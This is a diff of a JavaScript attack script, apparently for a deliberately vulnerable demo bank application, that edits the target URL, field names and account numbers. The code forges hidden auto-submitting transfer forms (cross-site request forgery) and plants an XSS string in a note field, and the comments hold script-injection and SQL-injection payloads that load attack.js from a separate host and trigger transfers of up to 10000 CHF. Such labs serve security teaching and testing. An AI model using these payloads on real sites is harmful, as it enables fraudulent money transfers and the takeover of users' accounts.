@@ -1,5 +1,5 @@
 function transferCSRF(formname, fromAccount, toAccount, amount, currency) {
-    addTransferForm(formname, fromAccount, toAccount, amount, currency, "http://localhost:8080/doTransfer");
+    addTransferForm(formname, fromAccount, toAccount, amount, currency, "http://vbank.0.0.0.0.xip.io:8080/doTransfer");
     document.getElementById(formname).submit();
 }
 
@@ -24,8 +24,8 @@ function addTransferForm(formname, fromAccount, toAccount, amount, currency, act
     }
     if (!document.getElementById(formname)) {
         var form = createHiddenForm(formname, "hiddenFrame", action)
-        createHiddenInput(form, "fromAccount", fromAccount);
-        createHiddenInput(form, "toAccount", toAccount);
+        createHiddenInput(form, "fromAccountNo", fromAccount);
+        createHiddenInput(form, "toAccountNo", toAccount);
         createHiddenInput(form, "amount", amount);
         createHiddenInput(form, "currency", currency);
         createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>hello XSS');
@@ -70,9 +70,9 @@ function submitTransferForm(formname, fromAccount) {
     }
 }
 
-//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob1","1-987654-1","2-542397-2","100","CHF")</script>
-//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob2","1-987654-1","2-542397-2","10000","CHF")</script>
-//http://localhost:8080/history?accountNo=1-987654-1%27+--+%3Cscript+src=%22http://localhost:9090/js/attack.js%22%3E%3C/script%3E%3Cscript%3Etransfer(null,%221-987654-1%22,%222-542397-2%22,%22800%22,%22CHF%22)%3C/script%3E
+//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","100","CHF")</script>
+//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob2","1-123456-11","3-123456-33","10000","CHF")</script>
+//http://localhost:8080/history?accountNo=1-123456-11%27+--+%3Cscript+src=%22http://localhost:9090/js/attack.js%22%3E%3C/script%3E%3Cscript%3Etransfer(null,%221-123456-11%22,%223-123456-33%22,%22800%22,%22CHF%22)%3C/script%3E
 
 // dec2hex :: Integer -> String
 function dec2hex (dec) {
